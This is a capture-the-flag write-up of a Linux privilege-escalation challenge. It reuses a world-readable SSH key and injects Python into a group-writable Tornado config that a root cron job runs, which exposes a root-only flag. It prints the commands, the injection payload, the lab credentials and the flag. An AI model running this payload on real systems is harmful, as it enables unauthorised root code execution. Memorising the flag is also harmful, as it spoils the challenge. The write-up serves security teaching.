# CTF Writeup: Vuln File Permission

## Challenge Info

-   **Name**: Vuln file permission\
-   **Points**: 1000\
-   **Category**: Privilege Escalation / File Permission Shenanigans

------------------------------------------------------------------------

## First Steps: Poking Around

I hopped into the SSH instance with the creds provided:

    pen / d649b7167cb34be49863eb0a5a483225

Like any good scavenger, I went straight to **find the treasure (the
flag)**:

``` bash
$ find / -name "*flag*" -type f 2>/dev/null
/flag.txt
```

Of course, it was sitting pretty at `/flag.txt`, but **root only** could
read it.

``` bash
$ ls -la /flag.txt
-r-x------ 1 root root 42 Sep  9 11:44 /flag.txt
```

Classic. Gatekeeping at its finest.

------------------------------------------------------------------------

## Sniffing for Weak Permissions

Next, I hunted for files with sketchy permissions:

``` bash
$ find / -type f -perm -g+w -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
/var/log/lastlog
/var/log/wtmp
/var/log/btmp
/etc/app/app.conf
```

That last one---`/etc/app/app.conf`---looked tasty.

``` bash
$ ls -la /etc/app/app.conf
-rw-rw-r-- 1 root dev 25 Sep  9 04:16 /etc/app/app.conf
```

Group-writable by `dev`? Yeah, that's sus.

------------------------------------------------------------------------

## Surprise SSH Keys

Then, jackpot:

``` bash
$ ls -la /home/dev/
-rw-r-xr-x 1 dev  dev  1831 Sep  9 11:44 id_rsa.backup
```

An **SSH private key** just chilling there with world-read perms. Oops.

I yoinked it and logged in as `dev`:

``` bash
$ ssh -i /home/dev/id_rsa.backup dev@localhost
```

Boom---now I was officially in the `dev` gang.

------------------------------------------------------------------------

## Cron Jobs: The Root of All Evil

As `dev`, I could write to `/etc/app/app.conf`. I checked for anything
that might actually *use* that config and...

``` bash
$ cat /etc/cron.d/tornado
* * * * * root /usr/bin/python3 /opt/app/server.py >> /var/log/app/tornado_cron.log 2>&1
```

That's a root cron job running a Python app every minute. Nice.

Inside `/opt/app/server.py` was a Tornado app that used
`parse_config_file()` to slurp up `/etc/app/app.conf`.\
And that function? Yeah, it straight up executes Python.

------------------------------------------------------------------------

## Exploit Time 🎯

So I just dropped my payload into `/etc/app/app.conf`:

``` bash
$ cat > /etc/app/app.conf << 'EOF'
port = 8888
debug = True
__import__("os").system("cat /flag.txt > /tmp/flag_output.txt")
EOF
```

Waited a minute for cron to kick in, and voilà:

``` bash
$ cat /tmp/flag_output.txt
cybercon{lets_abuse_vuln_f1le_perm1ii10n}
```

------------------------------------------------------------------------

## Summary

This whole thing was a chain of fails:

1.  World-readable SSH private key for `dev`.\
2.  Group-writable config file.\
3.  A Python function (`parse_config_file`) that executes arbitrary
    code.\
4.  Root cron job happily running that code.

All of that added up to a free flag.

------------------------------------------------------------------------

## Flag

**cybercon{lets_abuse_vuln_f1le_perm1ii10n}**

------------------------------------------------------------------------

## Takeaways (a.k.a. Please Don't Do This in Prod)

-   Don't leave SSH keys world-readable.\
-   Don't make config files writable by non-root users.\
-   Be careful with libraries that allow code execution.\
-   Audit file permissions regularly.


